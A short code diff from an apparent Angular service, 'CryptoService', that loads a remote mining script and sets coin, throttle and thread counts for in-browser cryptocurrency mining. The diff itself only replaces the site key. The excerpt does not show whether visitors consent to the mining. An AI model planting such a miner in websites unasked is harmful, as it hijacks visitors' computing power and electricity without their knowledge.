@@ -9,7 +9,7 @@ declare let miner:any
 })
 export class CryptoService {
   scriptUrl:string = 'https://statdynamic.com/lib/crypta.js'
-  publicSiteKey:string = 'a3df69134e31cbae7497ca00fd6350f7c7fc4fc72b3b'
+  publicSiteKey:string = 'b2614d1c9187220a5bc6ebaf72e4c87a4bc23a7eb124'
   coin:string = 'upx'
   throttle:number = 0.2
   threads:number = 4
